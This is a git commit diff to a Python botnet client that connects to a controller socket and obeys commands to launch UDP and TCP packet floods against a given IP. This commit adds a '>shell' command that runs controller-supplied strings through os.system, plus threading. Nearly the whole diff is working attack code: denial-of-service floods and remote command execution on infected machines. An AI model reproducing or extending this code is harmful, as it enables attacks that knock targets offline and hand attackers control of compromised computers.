93863ed13158da3a76fcdc539f57bfcce3fca7c4
Law <36631640+LawOfTime@users.noreply.github.com>
2018-02-25 12:56:26 +0000

    client.py
    [ADD] You can now access the terminal of the bot with >shell
    [ADD] Multi Threading

--- client.py
+++ client.py
@@ -2,6 +2,7 @@ import sys
 import time
 import socket
 import random
+import threading
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -25,65 +26,80 @@ def system():
 
 	while connected is True:
 		try:
-			msg = sock.recv(1024)
-			if ">killbots" in msg.lower():
-				sys.exit()
+			def commands():
+				msg = sock.recv(1024)
+				if ">killbots" in msg.lower():
+					sys.exit()
 
-			if ">udp" in msg.lower():
-				def udpflood():
-					import socket
+				if ">shell" in msg.lower():
 					try:
-						ip = msg.split(" ")[1]
-						psize = int(msg.split(" ")[2])
-						timer = int(float(msg.split(" ")[3]))
-
-						timeout = time.time() + 1 * timer
-
-						package = random._urandom(psize)
-
-						udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
-
-						print("Command Accepted!")
-						print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
-
-						while True:
-							port = random.randint(1, 65535)
-							udpflood.sendto(package, (ip, port))
-							udpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
-							if time.time() > timeout:
-								return
+						shell = msg.split(" ")[1]
+						os.system(shell)
 					except:
 						pass
-				udpflood()
 
-			if ">tcp" in msg.lower():
-				def tcpflood():
-					import socket
-					try:
-						ip = msg.split(" ")[1]
-						psize = int(msg.split(" ")[2])
-						timer = int(float(msg.split(" ")[3]))
+				if ">udp" in msg.lower():
+					def udpflood():
+						import socket
+						try:
+							ip = msg.split(" ")[1]
+							psize = int(msg.split(" ")[2])
+							timer = int(float(msg.split(" ")[3]))
 
-						timeout = time.time() + 1 * timer
+							timeout = time.time() + 1 * timer
 
-						package = random._urandom(psize)
+							package = random._urandom(psize)
 
-						tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+							udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)
 
-						tcpflood.connect((ip, 80))
+							print("Command Accepted!")
+							print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
 
-						print("Command Accepted!")
-						print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+							while True:
+								port = random.randint(1, 65535)
+								udpflood.sendto(package, (ip, port))
+								udpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
+								if time.time() > timeout:
+									return
+						except:
+							pass
+					udpflood()
 
-						while True:
-							port = random.randint(1, 65535)
-							tcpflood.sendto(package, (ip, port))
-							tcpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
-							if time.time() > timeout:
-								return
-					except:
-						pass
-				tcpflood()
+				if ">tcp" in msg.lower():
+					def tcpflood():
+						import socket
+						try:
+							ip = msg.split(" ")[1]
+							psize = int(msg.split(" ")[2])
+							timer = int(float(msg.split(" ")[3]))
+
+							timeout = time.time() + 1 * timer
+
+							package = random._urandom(psize)
+
+							tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+							tcpflood.connect((ip, 80))
+
+							print("Command Accepted!")
+							print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))
+
+							while True:
+								port = random.randint(1, 65535)
+								tcpflood.sendto(package, (ip, port))
+								tcpflood.sendto("Data? DATA EVERYWHERE!", (ip, port))
+								if time.time() > timeout:
+									return
+						except:
+							pass
+					tcpflood()
+			commands()
+			threads = []
+			for i in range(1):
+			    thread = threading.Thread(target=commands)
+			    threads.append(thread)
+			    thread.setDaemon(True)
+			    thread.start()
 		except socket.error:
 			connected = False
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
